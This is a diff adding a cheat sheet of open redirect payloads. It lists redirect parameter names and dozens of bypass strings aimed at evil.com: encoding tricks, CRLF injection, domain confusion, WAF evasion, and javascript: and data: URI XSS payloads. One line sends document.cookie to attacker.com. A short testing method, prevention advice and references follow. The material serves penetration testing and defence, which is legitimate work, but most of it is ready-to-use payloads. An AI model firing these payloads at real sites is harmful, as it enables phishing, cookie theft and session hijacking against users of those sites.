@@ -1,0 +1,127 @@
+Open Redirect Vulnerabilities and Payloads
+
+# Overview
+Open Redirect vulnerabilities occur when a web application accepts user-controlled input that specifies a link to an external site, and redirects users to this link without proper validation. These vulnerabilities can enable phishing attacks by redirecting users to malicious websites.
+
+# Common Redirect Parameters
+redirect, redirect_to, redirecturi, redirect_uri, return, returnurl, returnUri, return_url, return_to, url, next, link, goto, to, out, view, login_url, continue, dest, destination, redir, redirect_url, ReturnUrl, forward, forward_url, location, exit_url, target, navigate, returnTo, return_path, retUrl, next_url, rurl, r_url, u, uri, relaystate, redirectback, redirect_back, checkout_url, checkout, ref, reference, path, file, site, page, src, source, callback, go, go_to, move, nav, jump, jump_to, rpath, redirect_uri_path, success_url, success, login, logto, logon, loginto, openid_url, openidurl, idp, idp_uri, referer, redirect_from, returnURL, successURL, nextURL, home, homepage, landingpage, login_success, return_after_login
+
+# Comprehensive Open Redirect Payload List
+
+## Basic Payloads
+https://evil.com
+//evil.com
+\/\/evil.com
+evil.com
+
+## Protocol Bypass Techniques
+https:evil.com
+http:\/\/evil.com
+https:\/\/evil.com
+\\evil.com
+http:\\evil.com
+
+## Character Encoding
+%0D%0Ahttp://evil.com
+%09//evil.com
+/%09/evil.com
+/%5Cevil.com
+//%0D%0Aevil.com
+/%2F%2Fevil.com
+/%5C%5Cevil.com
+\/evil.com
+.evil.com
+
+## URL Encoding Variations
+%68%74%74%70%73%3A%2F%2Fevil.com        # https://evil.com URL encoded
+%68%74%74%70%3A%2F%2Fevil.com           # http://evil.com URL encoded
+
+## Double Encoding
+%252F%252Fevil.com
+%252F%252F%252F%252Fevil.com
+
+## Protocol Relative Bypass
+http:evil.com
+https:evil.com
+javascript:alert(document.domain)
+
+## CRLF Injection Attempts
+%0D%0A%0D%0A<img src=x onerror=alert(document.domain)>
+%0d%0aLocation:https://evil.com
+%0d%0aSet-Cookie:sessionid=123
+
+## Domain Confusion
+https://evil.com@legitimate-site.com
+https://legitimate-site.com.evil.com
+https://legitimate-site.com%40evil.com
+https://legitimate-site.com%2F%2Fevil.com
+https://legitimate-site.com%252F%252Fevil.com
+https://evil.com%23.legitimate-site.com
+https://evil.com%3F.legitimate-site.com
+
+## Data URI Scheme
+data:text/html,<script>window.location='https://evil.com'</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pOzwvc2NyaXB0Pg==
+
+## Null Byte and Fragment
+https://evil.com%00https://legitimate-site.com
+https://evil.com%2500https://legitimate-site.com
+https://evil.com#https://legitimate-site.com
+
+## Special Characters
+javascript://%0aalert(document.cookie)
+javascript://%0Aalert(document.cookie)
+//evil.com
+////evil.com
+///\@evil.com
+\/\/evil.com/
+/\/evil.com/
+javascript:alert(document.domain)
+
+## Advanced XSS Through Redirects
+javascript://alert(document.domain)
+javascript:fetch('//attacker.com/?cookie='+document.cookie)
+javascript://%0Aalert(document.cookie)
+
+## Multi-Level Redirects
+https://example.com/redirect?url=https://evil.com/redirect?url=https://malicious.com
+https://example.com/redirect?url=data:text/html,<script>window.location='https://evil.com'</script>
+
+## Common WAF Bypass
+javascripT://alert(document.domain)
+j%0A%0Davascript://alert(document.domain)
+%0Aj%0Davascript://alert(document.domain)
+%0Ajavascript://alert(document.domain)
+%0Djavascript://alert(document.domain)
+
+## Double URL Encodes
+%2F%252F%2565%2576%2569%256C%252E%2563%256F%256D/
+%2568%2574%2574%2570%253A%252F%252F%2565%2576%2569%256C%252E%2563%256F%256D/
+
+# Testing Methodology
+1. Identify redirect parameters in the application
+2. Test each parameter with different payloads
+3. Check if the application redirects to the malicious site
+4. Try different encoding techniques if basic payloads fail
+5. Verify if the application is performing proper validation
+
+# Prevention Measures
+1. Implement a whitelist of allowed redirect destinations
+2. Use indirect references to valid destinations rather than actual URLs
+3. Force all redirects to go through a page that requires the user to click a link
+4. Validate URLs against a pattern of allowed domains
+5. Ensure proper URL parsing and validation libraries are used
+
+# Real-world Impact
+Open Redirect vulnerabilities can lead to:
+- Phishing attacks
+- Credential theft
+- Session hijacking
+- CSRF attacks through redirect chains
+- Reputation damage
+- Data exfiltration when combined with other vulnerabilities
+
+# References
+- OWASP: https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html
+- PortSwigger: https://portswigger.net/kb/issues/00500100_open-redirection-reflected
+- HackTricks: https://book.hacktricks.xyz/pentesting-web/open-redirect
